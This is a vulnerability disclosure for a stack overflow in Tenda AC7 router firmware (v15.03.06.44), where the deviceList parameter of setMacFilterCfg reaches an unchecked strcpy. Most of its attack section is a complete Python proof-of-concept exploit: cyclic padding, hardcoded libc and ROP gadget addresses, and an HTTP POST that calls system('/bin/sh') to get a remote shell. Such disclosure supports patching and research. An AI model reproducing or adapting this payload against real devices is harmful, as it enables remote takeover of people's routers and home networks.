# Tenda_AC7 V1.0_V15.03.06.44 has a stack overflow vulnerability in parse_macfilter_rule

Vulnerability level: High risk (RCE)

Affected version: Firmware version <= Firmware v1.0_v15.03.06.44

Through the /bin/httpd binary file, we can find the formSetMacFilterCfg function.

The webGetVar program is used to obtain parameters. The parameters of deviceList are directly parsed without any detection

![image-20250720233215867](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250720233215867.png)

Continue to follow up, the final parameter will be passed to parse_macfilter_rule, strcpy can overflow here to control the return address, here we construct the rop chain to execute system('/bin/sh'), and finally successfully getshell, the attacker can remotely attack

![image-20250720233353881](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250720233353881.png)



POC

sudo chroot ./ ./qemu-mipsel-static -g 1234 ./bin/httpd

```
from pwn import *
import requests

#cmd = "echo PWN!"

cmd = b"/bin/sh"
libc_base = 0x7f526000
system=0x0060320
binsh=0x0006AE30
 
gadget1=libc_base+0x00060530
print(hex(gadget1))
gadget2=libc_base+0x0000DC1C
system_addr=libc_base+system
binsh_addr=libc_base+binsh

payload = cyclic(472)

payload+= p32(gadget1)*2+b"A"*20+p32(binsh_addr)+p32(system_addr)+b"A"*12+p32(gadget2)

url = "http://192.168.87.135/goform/setMacFilterCfg"

cookie = {"Cookie":"password=12345"}
data = {"macFilterType": "black", "deviceList": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)

```

Successfully obtained shell

![image-20250720233833000](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250720233833000.png)